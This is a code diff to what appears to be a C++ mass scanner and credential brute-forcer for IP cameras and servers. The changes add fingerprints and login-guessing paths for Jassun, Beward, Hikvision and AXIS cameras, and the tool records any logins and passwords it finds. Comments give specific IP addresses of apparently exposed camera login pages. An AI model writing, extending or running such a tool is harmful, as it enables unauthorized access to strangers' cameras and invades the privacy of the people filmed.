@@ -272,6 +272,10 @@ int globalSearchPrnt(const std::string *buff)
 
 int sharedDetector(const char * ip, int port, const std::string *buffcpy, const char *cp) {
 
+	int isDig = Utils::isDigest(buffcpy);
+	if (isDig == 1) return 101;
+	else if (isDig == 0) return 1;
+
     if(Utils::ustrstr(buffcpy, "401 authorization") != -1 
 		|| Utils::ustrstr(buffcpy, "401 unauthorized") != -1
         || (Utils::ustrstr(buffcpy, "www-authenticate") != -1 
@@ -381,9 +385,15 @@ int sharedDetector(const char * ip, int port, const std::string *buffcpy, const 
 		|| Utils::ustrstr(buffcpy, "/app/live/sim/single.asp") != -1)
 		)																				return 50; //Network Video System
 	if (Utils::ustrstr(buffcpy, "MASPRO DENKOH") != -1)									return 51; //MASPRO
-	if (Utils::ustrstr(buffcpy, "webcamXP") != -1 
+	if (Utils::ustrstr(buffcpy, "webcamXP") != -1
 		&& Utils::ustrstr(buffcpy, "a valid username/password") != -1
 		)																				return 52; //Webcamxp5
+	if (Utils::ustrstr(buffcpy, "NetSuveillance") != -1
+		&& Utils::ustrstr(buffcpy, "l_bgm.gif") != -1
+		)																				return 53; //Jassun (http://176.32.180.42/Login.htm)
+	if (Utils::ustrstr(buffcpy, "WEB SERVICE") != -1
+		&& Utils::ustrstr(buffcpy, "jsmain/liveview.js") != -1
+		)																				return 54; //Beward (http://46.146.243.88:88/login.asp)
 
     if(((Utils::ustrstr(buffcpy, "220") != -1) && (port == 21)) ||
         (Utils::ustrstr(buffcpy, "220 diskStation ftp server ready") != -1) ||
@@ -1209,7 +1219,7 @@ void _specWEBIPCAMBrute(const char *ip, int port, char *finalstr, int flag, char
 
 int _specBrute(const char *ip, int port,
                 char *finalstr, int flag,
-                char *path, char *comment, char *cp, int size)
+                char *path, char *comment, char *cp, int size, const std::string *buffer = NULL)
 {
 	const lopaStr &lps = BA::BALobby((string(ip) + string(path)).c_str(), port, (strcmp(comment, "[DIGEST]") == 0 ? true : false));
 	
@@ -1223,7 +1233,6 @@ int _specBrute(const char *ip, int port,
 	if(strstr(lps.login, "UNKNOWN") == NULL && strlen(lps.other) == 0) 
 	{
         _specFillerBA(ip, port, finalstr, lps.login, lps.pass, flag);
-
         fillGlobalLogData(ip, port, std::to_string(size).c_str(), finalstr, lps.login, lps.pass, comment, cp, "Basic Authorization");
 	};
 }
@@ -2479,7 +2488,9 @@ int Lexems::filler(char* ip, int port, const std::string *buffcpy, int size, Lex
 	}
 	else if (flag == 34) //Hikvision ip cam
 	{
-		_specBrute(ip, port, "[Hikvision] IP Camera", flag, "/PSIA/Custom/SelfExt/userCheck", "Basic Authorization", cp, size);
+		if (_specBrute(ip, port, "[Hikvision] IP Camera", flag, "/PSIA/Custom/SelfExt/userCheck", "Basic Authorization", cp, size) == -1){
+			_specBrute(ip, port, "[Hikvision] IP Camera", flag, "/PSIA/Custom/HIK/userCheck", "Basic Authorization", cp, size);
+		}
 	}
 	else if (flag == 35) //EasyCam
 	{
@@ -2584,10 +2595,20 @@ int Lexems::filler(char* ip, int port, const std::string *buffcpy, int size, Lex
 	{
 		_specWEBIPCAMBrute(ip, port, "[WEBCAMXP] WEB IP Camera", flag, "WEB Authorization", cp, size, "WEBCAMXP");
 	}
+	else if (flag == 53) //Jassun
+	{
+		_specWEBIPCAMBrute(ip, port, "[JASSUN] WEB IP Camera", flag, "WEB Authorization", cp, size, "JASSUN");
+	}
+	else if (flag == 54) //Beward
+	{
+		_specWEBIPCAMBrute(ip, port, "[BEWARD] WEB IP Camera", flag, "WEB Authorization", cp, size, "BEWARD");
+	}
 	else if (flag == 20) //AXIS Camera
 	{
-		if (_specBrute(ip, port, "AXIS Camera", flag, "/axis-cgi/com/ptz.cgi?", "Basic Authorization", cp, size) == -1){
-			_specBrute(ip, port, "AXIS Camera", flag, "/view/viewer_index.shtml?", "Basic Authorization", cp, size);
+		if (_specBrute(ip, port, "AXIS Camera", flag, "/mjpg/video.mjpg", "Basic Authorization", cp, size) == -1) {
+			if (_specBrute(ip, port, "AXIS Camera", flag, "/axis-cgi/com/ptz.cgi?", "Basic Authorization", cp, size) == -1) {
+				_specBrute(ip, port, "AXIS Camera", flag, "/view/viewer_index.shtml?", "Basic Authorization", cp, size);
+			}
 		}
 	}
 	else if (flag == 19) //reecam cameras
